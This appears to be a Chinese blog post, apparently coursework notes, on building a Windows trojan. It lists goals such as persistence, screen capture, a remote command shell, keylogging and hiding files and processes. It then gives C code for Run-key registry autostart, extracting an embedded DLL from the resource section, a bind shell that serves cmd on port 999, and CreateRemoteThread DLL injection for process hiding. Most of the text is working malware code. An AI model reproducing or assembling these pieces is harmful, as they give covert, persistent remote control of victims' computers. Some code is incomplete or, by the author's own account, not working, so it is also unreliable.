# 要求

1. 把加密后的b.dll放到a里面
2. 提取加密部分的数据
3. 解密
4. 执行解密后的数据



1.木马自启动【必做】
2.木马功能
   文件【必做】
   screen dump（截屏）【必做】
   command shell【必做】
   keylog（键盘记录）【选做】
3.木马抗查杀【选做】
4.木马隐藏
   文件【必做】
   进程【必做】
   端口【选做】
   启动盘【选做】


# 代码

## 自启动
通过设置注册表，在开机的时候自启动

```c
#include <windows.h>
#include <stdio.h>

int main()
{

	HKEY hKey;
    DWORD result;

    //打开注册表,记得双斜杠转义
    result = RegOpenKeyEx(
                 HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                 0,              // 保留参数必须填 0
                 KEY_WRITE,      // 打开权限，写入
                 &hKey           // 打开之后的句柄
             );
 
    if (result == ERROR_SUCCESS)
    {
        printf("open success!\n");
    }
    else
    {
        printf("open failed!\n");
        exit(-1);
    }
	
	//获取正在运行文件的路径
	char szModuleName[MAX_PATH]={0};
    GetModuleFileName(NULL,szModuleName,MAX_PATH);
	printf("%s\n",szModuleName);
	
    // 设置 NetworkAddress
    result = RegSetValueEx(
                 hKey,
                 "test",         // Name字段
                 0,              // 保留参数必须填 0
                 REG_SZ,         // 键值类型为字符串
                 (const unsigned char *)szModuleName, // 字符串首地址
                 strlen(szModuleName)   // 字符串长度
             );

    if (result == ERROR_SUCCESS)
    {
        printf("set success!\n");
    }
    else
    {
        printf("set failed!\n");
        exit(-2);
    }


	MessageBox(NULL,"test","test",0);


	return 0;

}
```







## 从资源段里提取数据
思路：提取出b.dll后再把b.dll注入其他进程，实现进程隐藏。
过程中会产生明文的b.dll。


环境：VC6.0


![在这里插入图片描述](https://img-blog.csdnimg.cn/20191125212643432.png)

选择import

导入之后
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191125212719535.png)




参考链接：
在VC中使用自定义资源,FindResource,LoadResource,LockResource - 荷包蛋 - 博客园
https://www.cnblogs.com/gakusei/articles/1352922.html



```c

int main()
{
	 //定位我们的自定义资源，这里因为我们是从本模块定位资源，所以将句柄简单地置为NULL即可
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_HELLO1),  "hello"  );
	if (hRsrc == NULL)
	{
		printf("FindResource failed\n");
		DWORD ierr = GetLastError();
		showErrorText(ierr);
	 return 0;
	}

	//获取资源的大小
	DWORD dwSize = SizeofResource(NULL, hRsrc);
	if (0 == dwSize)
	{
		return -1;
	}
	printf("size of resource:%d\n",dwSize);


	HGLOBAL hGlobal  = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
	{
		printf("LoadResource failed\n");
		return -2;
	}
	
	//返回值pBuffer为要使用的直系指向资源数据的内存指针
	LPVOID pBuffer = LockResource(hGlobal); 

	printf("%s\n",pBuffer);


	FILE* fp = fopen(".\\tmp100.exe", "wb");
	if (fp != NULL)
	{
		fwrite(pBuffer, dwSize, dwSize, fp);

	}
	fclose(fp);


	return 0;



}

/*
 * 根据错误码输出错误信息
 */
void showErrorText(DWORD error_num)
{
    char *msg = NULL;
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        error_num,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // 使用默认语言
        (LPSTR)&msg,
        0,
        NULL
    );
 
    printf("Error code %d: \n", error_num);
    if (msg == NULL)
    {
        printf("%s\n", "Unknown error");
	}
    else
    {
        printf("%s\n", msg);
	}
	
	system("pause"); 
}


```

## 截图
参考链接：
只找到了C语言实现截屏 - 秋叶落 - 博客园
https://www.cnblogs.com/wwj973/p/9610774.html


##  command shell
仅供参考
```c


#define MasterPort 999  //定义监听端口999
main()   //主函数入口
{
  .................
  //获取cmd路径
  GetEnvironmentVariable("COMSPEC",szCMDPath,sizeof(szCMDPath));
  //加载ws2_32.dll：
  WSAStartup(0x0202,&WSADa);
  //设置本地信息和绑定协议，建立socket，代码如下：
  SockAddrIn.sin_family = AF_INET;
 .......
  //设置绑定端口999：
  bind(CSocket,(sockaddr *)&SockAddrIn,sizeof(SockAddrIn));
  //设置服务器端监听端口：
  listen(CSocket,1);
  iAddrSize = sizeof(SockAddrIn);
  //开始连接远程服务器，并配置隐藏窗口结构体：
  SSocket = accept(CSocket,(sockaddr *)&SockAddrIn,&iAddrSize);
  ..........
  //创建匿名管道：
  CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
.............
}

```


## 注入dll，实现进程隐藏
参考链接：DLL 注入技术的 N 种姿势 - 知乎
https://zhuanlan.zhihu.com/p/28537697

显示注入成功，但是并不会执行DllMain，很奇怪。


```c
#include <windows.h>
#include <stdio.h>

int main()
{



	DWORD 	dwProcessId=1344;

	char pszLibFile[]="b.dll";
	DWORD dwSize = (lstrlenW((const unsigned short *)pszLibFile) + 1) * sizeof(wchar_t);



	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwProcessId);
	
	printf("hProcess:%p\n",hProcess);


	// 在远程进程中为路径名称分配空间
	LPVOID pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	printf("pszLibFileRemote:%p\n",pszLibFileRemote);


	// 将DLL路径名称复制到远程进程地址空间
	DWORD n = WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)pszLibFile, dwSize, NULL);
	printf("n:%p\n",n);



	// 获取Kernel32.dll中的LoadLibraryW函数的真正地址
	PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");

	printf("pfnThreadRtn:%p\n",pfnThreadRtn);


	// 创建远程线程调用LoadLibraryW(DLLPathname)
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, pszLibFileRemote, 0, NULL);
	
	if (hThread == NULL)
	{
		printf("%s\n","Error: Could not create the Remote Thread.\n");
		return(1);
	}else{
		printf("%s\n"," Success: DLL injected via CreateRemoteThread()");
	}
	

	return 0;

}

```

# 未完待续
